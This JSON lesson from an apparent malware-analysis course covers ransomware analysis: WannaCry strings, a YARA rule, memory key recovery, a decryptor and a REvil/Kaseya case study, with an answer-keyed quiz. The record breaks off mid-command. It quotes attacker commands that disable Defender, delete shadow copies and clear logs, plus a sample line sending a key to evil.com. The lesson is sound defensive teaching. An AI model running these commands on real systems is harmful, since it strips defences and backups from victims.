{
  "lesson_id": "c06dc2aa-7435-49ee-a92b-c2fa072ea02e",
  "domain": "malware",
  "title": "Ransomware Analysis: From Encryption to Decryption",
  "difficulty": 3,
  "order_index": 9,
  "prerequisites": [
    "a8f3c2d1-9e7b-4f5a-8d3c-1a2b3c4d5e6f"
  ],
  "concepts": [
    "Ransomware attack lifecycle",
    "Encryption algorithms (AES, RSA, ChaCha20)",
    "Key generation and management",
    "Ransom note analysis",
    "Network communication and C2",
    "Payment systems (Bitcoin, Monero)",
    "Decryption techniques",
    "Master key recovery",
    "Implementation flaws and vulnerabilities",
    "Ransomware families (WannaCry, Ryuk, REvil)"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Understand the complete ransomware attack lifecycle",
    "Analyze encryption implementations and identify weaknesses",
    "Extract and analyze ransom notes and payment mechanisms",
    "Identify ransomware families through behavioral and code analysis",
    "Master decryption techniques and key recovery methods",
    "Understand cryptocurrency payment tracking",
    "Analyze ransomware-as-a-service (RaaS) operations",
    "Apply incident response procedures for ransomware attacks"
  ],
  "post_assessment": [
    {
      "question": "What is the typical ransomware encryption approach to balance speed and security?",
      "options": [
        "RSA encryption for all files",
        "AES for file encryption, RSA for key encryption (hybrid encryption)",
        "Simple XOR encryption",
        "DES encryption only"
      ],
      "correct_answer": 1,
      "question_id": "00b29b51-bbf0-4142-a1c2-b37667f10b53",
      "type": "multiple_choice",
      "difficulty": 3,
      "explanation": "Explanation not provided."
    },
    {
      "question": "Which ransomware family exploited EternalBlue (MS17-010) for worm-like propagation?",
      "options": [
        "Ryuk",
        "REvil/Sodinokibi",
        "WannaCry",
        "Maze"
      ],
      "correct_answer": 2,
      "question_id": "6cc83375-18c0-45ce-907c-b6bd416617ac",
      "type": "multiple_choice",
      "difficulty": 3,
      "explanation": "Explanation not provided."
    },
    {
      "question": "What is double extortion ransomware?",
      "options": [
        "Ransomware that encrypts files twice for extra security",
        "Ransomware that demands payment in two different cryptocurrencies",
        "Ransomware that both encrypts data and threatens to leak it publicly",
        "Ransomware that targets two different systems simultaneously"
      ],
      "correct_answer": 2,
      "question_id": "d35767ae-4adf-4d33-b6bf-45b21e7c2086",
      "type": "multiple_choice",
      "difficulty": 3,
      "explanation": "Explanation not provided."
    },
    {
      "question": "Which file extension is commonly added to encrypted files by ransomware?",
      "options": [
        "Files are never renamed",
        "A custom extension specific to the ransomware family (e.g., .locked, .encrypted, .ryuk)",
        "Files always use .encrypted extension",
        "The original extension is kept unchanged"
      ],
      "correct_answer": 1,
      "question_id": "20c17b10-6f77-4ce8-a82d-34bbc809de3b",
      "type": "multiple_choice",
      "difficulty": 3,
      "explanation": "Explanation not provided."
    },
    {
      "question": "What is a common ransomware implementation flaw that can enable decryption?",
      "options": [
        "Using strong encryption algorithms",
        "Hardcoded encryption keys or weak random number generation",
        "Deleting shadow copies",
        "Displaying a ransom note"
      ],
      "correct_answer": 1,
      "question_id": "18bcc565-3d14-4d0b-ae7a-a22a941fbdf0",
      "type": "multiple_choice",
      "difficulty": 3,
      "explanation": "Explanation not provided."
    },
    {
      "question": "Which cryptocurrency is preferred by modern ransomware operators for its privacy features?",
      "options": [
        "Bitcoin (BTC)",
        "Ethereum (ETH)",
        "Monero (XMR)",
        "Dogecoin (DOGE)"
      ],
      "correct_answer": 2,
      "question_id": "0fb58009-e19d-4a0b-9589-59cf509d09b6",
      "type": "multiple_choice",
      "difficulty": 3,
      "explanation": "Explanation not provided."
    },
    {
      "question": "What technique do ransomware operators use to prevent volume shadow copy recovery?",
      "options": [
        "Disable System Restore",
        "Execute 'vssadmin delete shadows /all /quiet' or 'wmic shadowcopy delete'",
        "Encrypt the shadow copies",
        "Move shadow copies to different location"
      ],
      "correct_answer": 1,
      "question_id": "ff986c25-d6e9-43e5-af0a-5271d7f9d0ee",
      "type": "multiple_choice",
      "difficulty": 3,
      "explanation": "Explanation not provided."
    },
    {
      "question": "What is Ransomware-as-a-Service (RaaS)?",
      "options": [
        "A legitimate service that protects against ransomware",
        "A business model where ransomware developers rent out their malware to affiliates",
        "A decryption service offered by security companies",
        "A backup service that prevents ransomware damage"
      ],
      "correct_answer": 1,
      "question_id": "a99ee930-9d85-4d5d-9b98-eb3d3a4db6ba",
      "type": "multiple_choice",
      "difficulty": 3,
      "explanation": "Explanation not provided."
    },
    {
      "question": "Which Windows feature should organizations enable to help detect ransomware behavior?",
      "options": [
        "Autoplay",
        "Remote Desktop",
        "Controlled Folder Access (part of Windows Defender)",
        "Guest account"
      ],
      "correct_answer": 2,
      "question_id": "e2f90d2a-0afa-4238-beaf-7061326fb3b0",
      "type": "multiple_choice",
      "difficulty": 3,
      "explanation": "Explanation not provided."
    },
    {
      "question": "What is the primary reason security researchers analyze ransomware encryption implementations?",
      "options": [
        "To learn how to write better ransomware",
        "To find implementation flaws that enable decryption without paying ransom",
        "To admire the code quality",
        "To calculate ransom amounts"
      ],
      "correct_answer": 1,
      "question_id": "753d6d61-b54e-4d84-ac22-c450ce539d80",
      "type": "multiple_choice",
      "difficulty": 3,
      "explanation": "Explanation not provided."
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "meta_learning",
    "teach_like_im_10",
    "minimum_effective_dose",
    "memory_hooks",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "explanation",
      "content": {
        "text": "# Introduction to Ransomware\n\nRansomware is the most financially devastating form of malware in modern cybersecurity. In 2021 alone, ransomware attacks cost organizations an estimated **$20 billion globally**, with average ransom payments exceeding **$200,000** and recovery costs reaching into millions.\n\n## What Is Ransomware?\n\nRansomware is malware that encrypts victim files or systems and demands payment (ransom) for decryption. Modern ransomware has evolved from simple screen lockers to sophisticated crypto-ransomware with:\n\n- **Strong encryption**: Military-grade algorithms (AES-256, RSA-2048+)\n- **Automated propagation**: Worm-like spreading (WannaCry, NotPetya)\n- **Double extortion**: Encryption + data theft/leak threats\n- **Triple extortion**: Adding DDoS attacks to pressure victims\n- **Ransomware-as-a-Service (RaaS)**: Criminal business model with developers and affiliates\n\n## The Evolution of Ransomware\n\n**1989: AIDS Trojan** (First ransomware)\n- Distributed via floppy disks at WHO conference\n- Used simple symmetric encryption\n- Demanded $189 sent to Panama P.O. box\n- Easily decryptable\n\n**2005-2012: Early Crypto-Ransomware**\n- GPCode (2005): RSA encryption\n- Reveton (2012): Police-themed locker\n- Demanded payments via prepaid cards, Western Union\n\n**2013: CryptoLocker** (Game changer)\n- First modern crypto-ransomware\n- RSA-2048 + AES-256 hybrid encryption\n- Bitcoin payments ($300-$500)\n- Distributed via botnet (Gameover ZeuS)\n- Essentially unbreakable without private key\n\n**2017: WannaCry** (Global epidemic)\n- Exploited EternalBlue (NSA exploit leak)\n- Worm-like propagation\n- Infected 300,000+ computers in 150 countries\n- Crippled UK's NHS, FedEx, Telefónica\n- Kill switch domain stopped spread\n\n**2019-Present: Big Game Hunting**\n- Targeted attacks against large organizations\n- Ransom demands: $1M-$50M+\n- Double/triple extortion\n- Data leak sites (DarkSide Leaks, Babuk, etc.)\n- RaaS affiliates share profits (70-80% to affiliate, 20-30% to developer)\n\n## Why Analyze Ransomware?\n\nAs a malware analyst, understanding ransomware is critical for:\n\n1. **Incident Response**: Identifying ransomware family to determine decryption options\n2. **Vulnerability Research**: Finding implementation flaws that enable free decryption\n3. **Threat Intelligence**: Tracking ransomware groups and their TTPs\n4. **Prevention**: Understanding attack vectors to improve defenses\n5. **Legal/Attribution**: Supporting law enforcement investigations\n\nThis lesson will teach you to dissect ransomware from initial infection to potential decryption."
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "text": "**Mindset Moment: The Defender's Advantage**\n\nRansomware analysis can feel overwhelming. These are well-funded criminal operations with millions in revenue. But here's what keeps me going:\n\n**You Only Need to Win Once**\n\nRansomware operators need PERFECT encryption implementation. One mistake—a hardcoded key, weak RNG, key left in memory, improper key destruction—and you can save thousands of victims.\n\n**Real Stories of Success:**\n\n- **TeslaCrypt**: Fabian Wosar found the master key, releasing a free decryptor that saved victims millions\n- **Petya (Green variant)**: Security researchers reverse-engineered the key generation, enabling decryption\n- **Philadelphia**: Used a hardcoded RSA public key—researchers found the corresponding private key\n- **GandCrab**: Law enforcement obtained master keys, allowing mass decryption\n\n**Your Approach:**\n\n1. **Every ransomware sample is a puzzle**: There might be a solution\n2. **Document everything**: Your notes might help another analyst find the break\n3. **Collaborate**: Share findings with the community (Emsisoft, Kaspersky, security Twitter)\n4. **Don't give up**: Some decryptors took years to develop\n5. **Even without decryption**: Your analysis helps organizations prepare and respond\n\n**Remember**: Every sample you analyze makes you sharper. The ransomware developer wrote this code once. You're going to reverse-engineer it completely. Who has the harder job?\n\nLet's get to work!"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# Ransomware Attack Lifecycle\n\nUnderstanding the complete attack lifecycle helps you analyze each stage and find defensive opportunities.\n\n## Stage 1: Initial Access\n\nRansomware operators gain access through:\n\n**Phishing (Most common)**\n- Malicious email attachments (Office docs with macros, PDFs, executables)\n- Malicious links (drive-by downloads, credential harvesting)\n- Business Email Compromise (BEC)\n\n**Exploit Kits**\n- RIG, Fallout, Magnitude exploit kits\n- Target browser/plugin vulnerabilities\n- Redirect users to exploit landing pages\n\n**RDP Brute Force**\n- Scan internet for exposed RDP (port 3389)\n- Brute force weak passwords\n- Deploy ransomware manually\n\n**Stolen Credentials**\n- Purchase from dark web marketplaces\n- Use credentials from previous breaches\n- VPN access, cloud admin accounts\n\n**Supply Chain Compromise**\n- Compromise software updates (NotPetya via MeDoc)\n- Malicious software installers\n- Compromised managed service providers (MSPs)\n\n## Stage 2: Reconnaissance & Lateral Movement\n\nModern \"big game hunting\" ransomware doesn't deploy immediately:\n\n```\n1. Establish persistence (scheduled tasks, services, registry Run keys)\n2. Credential harvesting (Mimikatz, LSASS dumping)\n3. Network enumeration (AdFind, Bloodhound, port scanning)\n4. Privilege escalation (exploit CVEs, abuse misconfigurations)\n5. Lateral movement (PsExec, WMI, RDP)\n6. Domain admin compromise (Kerberoasting, DCSync)\n7. Backup identification and destruction\n8. Data exfiltration (for double extortion)\n```\n\nThis phase can last **days to months** (average: 3-4 weeks).\n\n## Stage 3: Pre-Encryption Actions\n\nBefore encryption, ransomware:\n\n**1. Disable Security Tools**\n```powershell\n# Common commands seen in ransomware\nGet-Process | Where-Object {$_.Name -match \"veeam|backup|sql|oracle|defender\"} | Stop-Process -Force\nSet-MpPreference -DisableRealtimeMonitoring $true\nSet-MpPreference -DisableIOAVProtection $true\nUninstall-WindowsFeature -Name Windows-Defender\n```\n\n**2. Delete Shadow Copies**\n```cmd\nvssadmin.exe delete shadows /all /quiet\nwmic.exe shadowcopy delete\nbcdedit /set {default} bootstatusPolicy ignoreallfailures\nbcdedit /set {default} recoveryenabled no\nwbadmin delete catalog -quiet\n```\n\n**3. Kill Processes/Services**\n- Database servers (SQL, Oracle, MySQL)\n- Backup software (Veeam, Acronis)\n- Email servers (Exchange)\n- Virtual machines (VMware, Hyper-V)\n\n**4. Clear Event Logs**\n```powershell\nGet-EventLog -List | ForEach-Object {Clear-EventLog $_.Log}\nwevtutil cl System\nwevtutil cl Security\nwevtutil cl Application\n```\n\n## Stage 4: Encryption\n\n**Hybrid Encryption Scheme (Standard approach):**\n\n```\n1. Generate random symmetric key (AES-256)\n2. Encrypt file with AES key (FAST)\n3. Encrypt AES key with RSA public key (SLOW but secure)\n4. Store encrypted AES key in file header or separate file\n5. Delete original AES key from memory\n6. Rename file with ransomware extension\n```\n\n**Optimization Techniques:**\n- **Partial encryption**: Only encrypt first N MB (faster, less noticeable)\n- **Multithreading**: Parallel encryption of multiple files\n- **File type targeting**: Skip system files, prioritize documents/databases\n- **Network share encryption**: Mounted drives, UNC paths\n\n## Stage 5: Ransom Demand\n\n**Ransom Note Generation:**\n- Dropped in every encrypted folder (`README.txt`, `HOW_TO_DECRYPT.html`)\n- Desktop wallpaper changed\n- Displayed in MessageBox\n\n**Typical Contents:**\n```\n- What happened (\"Your files are encrypted\")\n- Payment instructions (Bitcoin/Monero address, amount)\n- Payment deadline (\"Pay within 72 hours or price doubles\")\n- Leak threat (\"Pay or data published on our leak site\")\n- Contact information (Tor site, email, Tox ID)\n- \"Guarantee\" (\"Pay and we'll decrypt, we're professionals\")\n- Warnings (\"Don't use decryption tools or files will be lost\")\n```\n\n## Stage 6: Payment & Decryption (or Not)\n\n**If victim pays:**\n1. Victim sends proof of payment\n2. Operator provides decryption tool\n3. Decryption success rate: 60-70% (tools are often buggy)\n4. Some operators disappear after payment (exit scam)\n\n**Law enforcement recommendation**: Don't pay\n- Funds criminal operations\n- No guarantee of decryption\n- May be targeted again\n\nBut reality: Many organizations pay (especially if backups failed)"
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "text": "**Memory Aid: Ransomware Analysis Checklist - \"DEEP SCAN\"**\n\nWhen analyzing a ransomware sample, remember **DEEP SCAN**:\n\n**D** - **Detonation**: Run in isolated sandbox, monitor behavior\n**E** - **Encryption scheme**: Identify algorithms (AES? RSA? ChaCha20?)\n**E** - **Entry point**: How does it execute? (dropper, loader, direct execution)\n**P** - **Propagation**: Does it spread? (network shares, worm capabilities)\n\n**S** - **Shadow copies**: Does it delete backups? (vssadmin, wmic)\n**C** - **Communication**: C2 server? Tor? HTTP/HTTPS? Offline?\n**A** - **Artifacts**: Ransom note, file extensions, registry keys, mutexes\n**N** - **Network shares**: Does it encrypt mapped/UNC paths?\n\nRun through this checklist systematically and you won't miss critical indicators!"
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "# Hands-On: Static Analysis of Ransomware Sample\n\nLet's analyze a ransomware sample (we'll use WannaCry as the example, but techniques apply to any ransomware).\n\n## Safety First!\n\n**CRITICAL**: Never analyze ransomware on your primary system!\n\n**Safe analysis environment:**\n- Isolated VM (no network, no shared folders)\n- Snapshot before analysis (easy rollback)\n- FlareVM or REMnux (pre-configured malware analysis VMs)\n- Physical air-gapped system (best for dangerous samples)\n\n## Step 1: Basic Static Analysis\n\n```bash\n# Calculate hashes (for threat intelligence lookup)\nsha256sum wannacry.exe\n# Output: 24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c\n\n# Check file type\nfile wannacry.exe\n# Output: PE32 executable (GUI) Intel 80386, for MS Windows\n\n# Extract strings (look for ransom note, URLs, file extensions)\nstrings wannacry.exe > wannacry_strings.txt\n\n# Key strings found:\ngrep -E \".onion|.WNCRY|bitcoin|ransom\" wannacry_strings.txt\n\nOutput:\nwww.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com  # Kill switch domain!\ngx7ekbenv2riucmf.onion   # Tor payment site\n57g7spgpgjlwnxp.onion    # Tor payment site\n.WNCRY                    # File extension\nmsg/m_bulgarian.wnry     # Ransom note (multiple languages)\nmsg/m_english.wnry\n```\n\n## Step 2: Import Table Analysis\n\n```bash\n# Using pefile (Python library)\npython3\n>>> import pefile\n>>> pe = pefile.PE('wannacry.exe')\n>>> for entry in pe.DIRECTORY_ENTRY_IMPORT:\n...     print(entry.dll.decode())\n...     for imp in entry.imports:\n...         print(f\"  {imp.name.decode()}\")\n\nOutput:\nKERNEL32.dll\n  CreateFileA              # File operations\n  FindFirstFileA\n  WriteFile\n  DeleteFileA\n  CreateProcessA           # Process creation\nADVAPI32.dll\n  CryptAcquireContextA     # Cryptography!\n  CryptGenKey              # Key generation\n  CryptEncrypt             # Encryption function\n  CryptDestroyKey\nWS2_32.dll\n  socket                   # Network functionality\n  connect\n  send\n  recv\n```\n\n**Red flags for ransomware:**\n- Crypto API functions (CryptEncrypt, CryptGenKey)\n- File operations (CreateFile, WriteFile, DeleteFile)\n- Process/service manipulation\n- Network communications\n\n## Step 3: Identify Encryption Algorithm\n\n```bash\n# Search for crypto constants\n# AES S-box (first few bytes):\nhexdump -C wannacry.exe | grep \"63 7c 77 7b f2 6b 6f c5\"\n\n# RSA modulus indicators (large hex values)\n# ChaCha20 constants: \"expand 32-byte k\"\nstrings wannacry.exe | grep -i \"expand.*byte\"\n\n# Use Detect-It-Easy (DIE) or PEiD for crypto detection\n```\n\n## Step 4: Ransom Note Extraction\n\n```bash\n# Extract embedded resources\npeframe wannacry.exe --sections\n\n# WannaCry stores ransom notes as resources\n# Extract using Resource Hacker or pe-tools\npython3\n>>> import pefile\n>>> pe = pefile.PE('wannacry.exe')\n>>> for resource_type in pe.DIRECTORY_ENTRY_RESOURCE.entries:\n...     if hasattr(resource_type, 'directory'):\n...         for resource in resource_type.directory.entries:\n...             # Extract and save resources\n```\n\nExample ransom note (WannaCry):\n```\nOops, your important files are encrypted.\n\nIf you see this text, your files are no longer accessible.\nYou may have been looking for a way to recover your files.\nDon't waste your time. No one can recover your files without our decryption service.\n\nCan I Recover My Files?\nYes, we guarantee you can recover all your files safely and easily.\n\nHow Do I Pay?\nPayment is accepted in Bitcoin only.\nFor more information, click <About bitcoin>.\nPlease check the current price of Bitcoin and buy some bitcoins.\n```\n\n## Step 5: YARA Rule Creation\n\n```yara\nrule WannaCry_Ransomware {\n    meta:\n        description = \"Detects WannaCry ransomware\"\n        author = \"Your Name\"\n        date = \"2025-01-15\"\n        hash = \"24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c\"\n    \n    strings:\n        // Kill switch domain\n        $killswitch = \"www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\" wide ascii\n        \n        // Onion domains\n        $onion1 = \"gx7ekbenv2riucmf.onion\" wide ascii\n        $onion2 = \"57g7spgpgjlwnxp.onion\" wide ascii\n        \n        // File extension\n        $ext = \".WNCRY\" wide ascii\n        \n        // Ransom note strings\n        $ransom1 = \"Ooops, your important files are encrypted\" wide ascii\n        $ransom2 = \"Wanna Decrypt0r\" wide ascii\n        \n        // Crypto functions (opcodes)\n        $crypto1 = {68 00 80 00 00 6A 03}  // CryptAcquireContext parameters\n        $crypto2 = {6A 00 6A 00 68 01 66 00 00}  // CryptEncrypt parameters\n    \n    condition:\n        uint16(0) == 0x5A4D and  // MZ header\n        filesize < 10MB and\n        (\n            $killswitch or\n            (2 of ($onion*)) or\n            (all of ($ransom*)) or\n            (2 of ($crypto*))\n        )\n}\n```\n\n## Step 6: Threat Intelligence Lookup\n\n```bash\n# Query VirusTotal\ncurl --request GET \\\n  --url https://www.virustotal.com/api/v3/files/24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c \\\n  --header 'x-apikey: YOUR_API_KEY'\n\n# Query Hybrid Analysis\n# Upload to https://www.hybrid-analysis.com/\n\n# Query ANY.RUN\n# Interactive online sandbox: https://app.any.run/\n\n# Query ID Ransomware\n# Upload ransom note: https://id-ransomware.malwarehunterteam.com/\n```\n\nThis static analysis gives you:\n- Ransomware family identification\n- Encryption methods\n- Network indicators (C2, payment sites)\n- File artifacts (extensions, ransom notes)\n- YARA rules for detection"
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "# Hands-On: Dynamic Analysis and Decryption Opportunities\n\n## Step 1: Sandbox Detonation\n\n**Using Cuckoo Sandbox:**\n\n```bash\n# Submit sample to Cuckoo\ncuckoo submit wannacry.exe\n\n# Monitor in real-time\ncuckoo web\n# Navigate to http://localhost:8000\n\n# Key behavioral indicators to watch:\n# 1. File I/O (files being encrypted)\n# 2. Registry modifications\n# 3. Process creation\n# 4. Network connections\n# 5. API calls (crypto APIs)\n```\n\n**Key Behavioral Indicators:**\n\n```json\n{\n  \"files_written\": [\n    \"C:\\\\Users\\\\Admin\\\\Desktop\\\\document.docx.WNCRY\",\n    \"C:\\\\Users\\\\Admin\\\\Desktop\\\\@Please_Read_Me@.txt\",\n    \"C:\\\\Users\\\\Admin\\\\Desktop\\\\@WanaDecryptor@.exe\"\n  ],\n  \"files_deleted\": [\n    \"C:\\\\Users\\\\Admin\\\\Desktop\\\\document.docx\"\n  ],\n  \"commands_executed\": [\n    \"vssadmin.exe delete shadows /all /quiet\",\n    \"wbadmin delete catalog -quiet\",\n    \"bcdedit /set {default} recoveryenabled no\"\n  ],\n  \"registry_keys\": [\n    \"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\WannaCry\"\n  ],\n  \"network_connections\": [\n    {\"domain\": \"www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\", \"result\": \"NXDOMAIN\"},\n    {\"ip\": \"192.168.1.50\", \"port\": 445, \"protocol\": \"SMB\"}  // Worm behavior!\n  ],\n  \"mutexes\": [\n    \"Global\\\\MsWinZonesCacheCounterMutexA\"  // Infection marker\n  ]\n}\n```\n\n## Step 2: Memory Forensics for Key Recovery\n\nSome ransomware keeps encryption keys in memory temporarily—this is your chance!\n\n```bash\n# Dump process memory (during/after encryption)\nprocdump -ma ransomware.exe ransomware_memory.dmp\n\n# OR use Volatility\nvol.py -f memory.dmp windows.pslist\nvol.py -f memory.dmp windows.memmap --pid <PID> --dump\n\n# Search for AES keys (16/24/32 bytes of high entropy)\npython3\n>>> import re\n>>> with open('ransomware_memory.dmp', 'rb') as f:\n...     data = f.read()\n...\n>>> # AES keys have high entropy - look for 32-byte sequences\n>>> # This is simplified - real key extraction is more complex\n>>> for match in re.finditer(b'.{32}', data):\n...     key = match.group(0)\n...     entropy = calculate_entropy(key)\n...     if entropy > 7.5:  # High entropy threshold\n...         print(f\"Potential key at offset {match.start()}: {key.hex()}\")\n\n# Try extracted keys with decryption tools\n```\n\n**Real example: Petya (Green variant)**\n\nSecurity researchers found the encryption key generation algorithm had a flaw:\n\n```python\n# Petya's flawed key derivation (simplified)\nimport hashlib\n\ndef petya_generate_key(disk_id, timestamp):\n    # Flaw: Limited keyspace due to predictable inputs\n    key_material = f\"{disk_id}{timestamp}\".encode()\n    key = hashlib.sha256(key_material).digest()\n    return key[:16]  # 128-bit key\n\n# Researchers brute-forced the limited keyspace\n# They created a decryption tool using this finding\n```\n\n## Step 3: Identifying Decryption Opportunities\n\n**Common Ransomware Implementation Flaws:**\n\n**1. Hardcoded Keys**\n\n```python\n# BAD RANSOMWARE (yes, this happens!)\nAES_KEY = b'SuperSecretKey12'  # Hardcoded key!\n\ndef encrypt_file(filepath):\n    cipher = AES.new(AES_KEY, AES.MODE_CBC)\n    # ... encryption ...\n```\n\nSolution: Extract key from binary, create decryptor.\n\n**2. Weak Random Number Generation**\n\n```c\n// BAD: Using time() as seed\nsrand(time(NULL));\nfor (int i = 0; i < 32; i++) {\n    key[i] = rand() % 256;  // Predictable!\n}\n```\n\nSolution: Brute force based on possible time values.\n\n**3. Key Transmitted to C2 (Insecurely)**\n\n```python\n# BAD: Sending key over HTTP\nimport requests\nkey = generate_random_key()\nrequests.post('http://evil.com/keys', data={'key': key.hex()})\n```\n\nSolution: If C2 seized or traffic captured, keys can be recovered.\n\n**4. Key Left in Memory**\n\n```c\n// BAD: Not wiping key from memory\nunsigned char key[32];\ngenerate_key(key);\nencrypt_files(key);\n// Key still in memory!\nreturn 0;\n\n// GOOD: Securely wipe\nSecureZeroMemory(key, sizeof(key));\n```\n\nSolution: Memory forensics during/after infection.\n\n**5. Using Same Key for All Victims**\n\n```python\n# BAD: Single master key for entire campaign\nMASTER_KEY = load_from_config()\n\ndef encrypt_file(filepath):\n    cipher = AES.new(MASTER_KEY, AES.MODE_CBC)\n```\n\nSolution: If one key recovered, decrypt all victims.\n\n## Step 4: Building a Decryptor (Example)\n\nLet's say you found a hardcoded AES key:\n\n```python\n#!/usr/bin/env python3\n# Decryptor for \"BadRansom\" ransomware (fictional example)\n\nfrom Crypto.Cipher import AES\nimport os\n\n# Key extracted from ransomware binary at offset 0x4210\nHARDCODED_KEY = bytes.fromhex('6b657920666f756e6420696e2062696e617279206669206c65')\nENCRYPTED_EXTENSION = '.badransom'\n\ndef decrypt_file(encrypted_path):\n    \"\"\"Decrypt a single file encrypted by BadRansom\"\"\"\n    \n    # Read encrypted file\n    with open(encrypted_path, 'rb') as f:\n        # BadRansom stores IV in first 16 bytes\n        iv = f.read(16)\n        encrypted_data = f.read()\n    \n    # Decrypt\n    cipher = AES.new(HARDCODED_KEY, AES.MODE_CBC, iv)\n    decrypted_data = cipher.decrypt(encrypted_data)\n    \n    # Remove PKCS7 padding\n    padding_length = decrypted_data[-1]\n    decrypted_data = decrypted_data[:-padding_length]\n    \n    # Write decrypted file (remove extension)\n    original_path = encrypted_path.replace(ENCRYPTED_EXTENSION, '')\n    with open(original_path, 'wb') as f:\n        f.write(decrypted_data)\n    \n    print(f\"[+] Decrypted: {original_path}\")\n    return True\n\ndef scan_and_decrypt(root_dir):\n    \"\"\"Recursively find and decrypt all encrypted files\"\"\"\n    count = 0\n    \n    for dirpath, dirnames, filenames in os.walk(root_dir):\n        for filename in filenames:\n            if filename.endswith(ENCRYPTED_EXTENSION):\n                filepath = os.path.join(dirpath, filename)\n                try:\n                    decrypt_file(filepath)\n                    count += 1\n                except Exception as e:\n                    print(f\"[-] Failed to decrypt {filepath}: {e}\")\n    \n    print(f\"\\n[+] Successfully decrypted {count} files!\")\n\nif __name__ == '__main__':\n    import sys\n    if len(sys.argv) != 2:\n        print(\"Usage: python decryptor.py <directory>\")\n        sys.exit(1)\n    \n    target_dir = sys.argv[1]\n    print(f\"[*] Scanning {target_dir} for encrypted files...\")\n    scan_and_decrypt(target_dir)\n    print(\"[*] Decryption complete!\")\n```\n\n**Real Decryptors Available:**\n\n- **Emsisoft**: https://www.emsisoft.com/ransomware-decryption-tools/\n- **Kaspersky**: https://noransom.kaspersky.com/\n- **Avast**: https://www.avast.com/ransomware-decryption-tools\n- **No More Ransom**: https://www.nomoreransom.org/ (126 free decryption tools!)\n\nAlways check these resources before paying ransom!"
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "# Real-World Case Study: REvil/Sodinokibi Ransomware\n\n## Background\n\nREvil (Ransomware Evil) / Sodinokibi was one of the most prolific ransomware-as-a-service operations from 2019-2021. At its peak:\n\n- **$100M+ in ransom payments** collected\n- **High-profile victims**: JBS (meat supplier), Kaseya (MSP software), Acer ($50M demand)\n- **Sophisticated operation**: Professional support, leak site, affiliate program\n- **Takedown**: July 2021 (coordinated law enforcement action)\n\n## The Kaseya Supply Chain Attack (July 2021)\n\nThis was REvil's most devastating attack and ultimately led to their downfall.\n\n### The Attack\n\n**Friday, July 2, 2021 - 2:00 PM EST (deliberate timing before holiday weekend)**\n\n1. REvil affiliates exploited a zero-day vulnerability in Kaseya VSA (remote monitoring and management software)\n2. Pushed malicious \"software update\" to all managed endpoints\n3. **1,500+ companies infected** (through ~60 MSPs)\n4. Ransomware deployed simultaneously across all victims\n5. Demanded **$70M in Bitcoin** for universal decryptor\n\n### Technical Analysis\n\n**Initial Access:**\n```\nVulnerability: CVE-2021-30116 (SQL injection in Kaseya VSA web interface)\n              + Authentication bypass\n              + File upload leading to RCE\n\nPayload delivered via Kaseya's \"Agent Procedure\" feature:\n  1. Drop agent.crt (Base64-encoded ransomware)\n  2. Disable Windows Defender\n  3. Execute ransomware\n```\n\n**Ransomware Execution Flow:**\n\n```powershell\n# Actual commands observed:\n\n# 1. Disable Windows Defender\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend\n\n# 2. Decode and drop ransomware\ncertutil -decode C:\\kworking\\agent.crt C:\\kworking\\agent.exe\n\n# 3. Execute with admin privileges\nC:\\kworking\\agent.exe -d\n\n# 4. Delete evidence\ndel /q /f C:\\kworking\\agent.crt C:\\kworking\\agent.exe\n```\n\n**REvil Technical Characteristics:**\n\n```c\n// Encryption: Salsa20 (symmetric) + Elliptic Curve (asymmetric)\n// Why? Faster than AES+RSA hybrid\n\n// 1. Generate random Salsa20 key for each file\nuchar file_key[32];\nget_random_bytes(file_key, 32);\n\n// 2. Encrypt file with Salsa20\nsalsa20_encrypt(file_data, file_key);\n\n// 3. Encrypt file key with victim's public EC key\nec_encrypt(file_key, victim_public_key);\n\n// 4. Victim's private key encrypted with operator's public key\n// Only operator can decrypt victim's private key → only operator can decrypt files\n```\n\n**Ransom Note (Example):**\n\n```\n---=== Welcome. Again. ===---\n\n[+] Whats Happen? [+]\n\nYour files are encrypted, and currently unavailable. You can check it: all files on your system has extension [random_ext].\n\nBy the way, everything is possible to recover (restore), but you need to follow our instructions. Otherwise, you cant return your data (NEVER).\n\n[+] What guarantees? [+]\n\nIts just a business. We absolutely do not care about you and your deals, except getting benefits. If we do not do our work and liabilities - nobody will not cooperate with us. Its not in our interests.\n\nIf you will not cooperate with our service - for us, its does not matter. But you will lose your time and data, cause just we have the private key. In practice - time is much more valuable than money.\n\n[+] How to get access on website? [+]\n\n1. Download and install Tor Browser: https://www.torproject.org/\n2. Open link in Tor Browser: http://[random].onion?[victim_id]\n3. Follow the instructions on website.\n\n!!! DANGER !!!\nDONT try to change files by yourself, DONT use any third party software for restoring your data or antivirus solutions - its may entail damage of the private key and, as result, The Loss all data.\n!!! !!! !!!\nONE MORE TIME: Its in your interests to get your files back. From our side, we (the best specialists) make everything for restoring, but please should not interfere.\n```\n\n### The Investigation\n\nYou're part of the incident response team for a mid-sized MSP affected by this attack. Your tasks:\n\n**1. Contain the Spread**\n```bash\n# Immediately: Shut down Kaseya VSA servers\nsystemctl stop kaseya-vsa\n\n# Isolate infected endpoints\n# Block C2 domains at firewall\n# Disable RDP access from internet\n```\n\n**2. Identify Patient Zero**\n```powershell\n# Find earliest infection timestamp\nGet-ChildItem -Path C:\\ -Recurse 